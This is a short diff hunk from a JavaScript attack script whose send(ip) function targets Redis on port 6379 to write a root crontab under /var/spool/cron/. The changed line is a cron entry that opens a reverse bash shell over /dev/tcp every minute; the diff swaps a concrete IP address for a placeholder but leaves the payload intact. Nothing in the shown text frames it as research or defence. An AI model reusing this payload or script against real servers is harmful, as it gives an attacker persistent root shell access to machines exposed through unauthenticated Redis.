@@ -103,7 +103,7 @@ function send(ip) {
 	var port= '6379';
 	var dir = '/var/spool/cron/';
 	var filename = 'root';
-	var content = '*/1 * * * * /bin/bash -i >& /dev/tcp/47.93.4.61/9999 0>&1';
+	var content = '*/1 * * * * /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/9999 0>&1';
 	var url = "http://" + ip + ":" + port;
  
 	var cmd = new XMLHttpRequest();
